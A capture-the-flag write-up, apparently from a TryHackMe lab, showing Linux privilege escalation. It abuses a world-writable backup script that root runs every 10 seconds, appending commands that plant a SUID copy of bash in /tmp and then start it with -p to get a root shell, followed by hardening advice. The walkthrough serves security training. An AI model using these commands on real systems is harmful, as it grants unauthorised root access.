### Linux Privilege Escalation: Cron Job / Script Race Condition via World-Writable Script

### 📝 Description

This note details a privilege escalation vector involving a recurring administrative background process running with root privileges (UID=0). Because the script executed by the process has world-writable permissions, any unprivileged user can append arbitrary commands to it to execute them with elevated privileges. 

### 🔍 Phase 1: Enumeration & Discovery

### 1. Process Monitoring with pspy

Standard tools like ps aux might miss short-lived cron jobs or tight loops. Using pspy64 allows for unprivileged, real-time monitoring of process creation without requiring root access. 

bash

# Executing pspy to monitor background processes
./pspy64

Use code with caution.

**Observed Output:**
The logs show a repetitive cycle executing roughly every 10 seconds under UID=0 (root): 

text

2026/08/28 08:14:34 CMD: UID=0     PID=1839   | /bin/bash /var/local/syslog-backup.sh 
2026/08/28 08:14:34 CMD: UID=0     PID=1841   | tar -czf /var/backup/syslog.tar.gz /var/log/syslog 
2026/08/28 08:14:34 CMD: UID=0     PID=1843   | sleep 10 

Use code with caution.

### 2. Inspecting File Permissions

Checking the targeted script reveals a major security misconfiguration—it is world-writable (-rwxrwxrwx): 

bash

john@ip-10-49-140-63:~$ ls -la /var/local/syslog-backup.sh
-rwxrwxrwx  1 root staff   68 Jun 28 09:10 /var/local/syslog-backup.sh

Use code with caution.

### 💥 Phase 2: Exploitation (SUID Shell Method)

Since the script executes as root every 10 seconds, we can inject a payload that creates a persistent SUID binary back into our user space. 

### 1. Inject the Payload

Append commands to copy the system shell binary to /tmp and apply the SUID (+s) bit to it: 

bash

echo -e "cp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash" >> /var/local/syslog-backup.sh

Use code with caution.

### 2. Verify Execution

Wait 10–20 seconds for the cron job / timer to cycle. Check the /tmp directory to ensure the binary was created and possesses SUID permissions: 

bash

ls -la /tmp/rootbash
# Expected output: -rwsr-xr-x 1 root root ... /tmp/rootbash

Use code with caution.

### 3. Trigger the Root Shell

Modern implementations of bash automatically drop root privileges if run from an unprivileged context. To prevent this security feature from triggering, pass the -p (privileged) flag: 

bash

/tmp/rootbash -p

Use code with caution.

**Result:** 

text

rootbash-5.2# id
uid=1001(john) gid=1001(john) euid=0(root) groups=1001(john)
rootbash-5.2# cat /root/flag.txt
THM{getting-root-with-pspy}

Use code with caution.

### 🛡️ Remediation & Hardening

To secure this system and prevent this vulnerability, execute the following steps as an administrator: 

1. **Restrict Script Permissions:** Remove write privileges for group and others. Only the root user should be allowed to modify the script. 

bash

sudo chmod 744 /var/local/syslog-backup.sh

Use code with caution.
2. **Review Directory Permissions:** Ensure unprivileged users cannot delete or replace files within /var/local/ if the directory permissions are loosely defined.
